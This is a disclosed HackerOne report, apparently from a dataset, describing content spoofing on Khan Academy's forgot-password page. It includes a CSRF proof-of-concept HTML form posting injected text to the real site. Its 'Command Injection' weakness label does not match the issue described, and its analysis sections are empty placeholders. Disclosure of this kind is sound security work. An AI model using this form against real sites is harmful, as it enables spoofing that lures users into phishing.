---
source: hackerone
dataset: elamaran619/hackerone_disclosed_reports
h1_id: '159213'
original_report_id: '159213'
title: The web app's forgot password page is vulnerable to text injection/content
  spoofing
weakness: Command Injection - Generic
team_handle: khanacademy
created_at: '2016-08-14T09:16:21.307Z'
disclosed_at: '2017-03-01T15:53:53.226Z'
has_bounty: false
visibility: full
substate: resolved
vote_count: 5
tags:
- hackerone
- command-injection-generic
---

# The web app's forgot password page is vulnerable to text injection/content spoofing

## Metadata

- HackerOne Report ID: 159213
- Weakness: Command Injection - Generic
- Program: khanacademy
- Disclosed At: 2017-03-01T15:53:53.226Z
- Has Bounty: No
- Visibility: full
- Substate: resolved

## Original Report

An attacker will exploit this by chaining it with CSRF (there is not protection against CSRF for that page) as scenario can only be created by a POST request.
The attacker will target innocent users by doing this and some of them would fall in trap by calling the number or by sending the email. More about attack scenario at https://www.owasp.org/index.php/Content_Spoofing

Refer the attached image as proof of concept.

Also the proof of exploiting it using CSRF is:

<html>
  <body>
    <form action="https://www.khanacademy.org/forgotpw" method="POST">
      <input type="hidden" name="email" value="<the malicous text will come here>" />
      <input type="hidden" name="reset" value="Reset&#32;password" />
      <input type="submit" value="Submit request" />
    </form>
  </body>
</html>

## Extracted Security Notes

### Likely Vulnerability Class

*Leave this section for future enrichment.*

### Likely Root Cause

*Leave this section for future enrichment.*

### Potential Impact

*Leave this section for future enrichment.*

### Defensive Test Cases

*Leave this section for future enrichment.*

### Remediation Ideas

*Leave this section for future enrichment.*
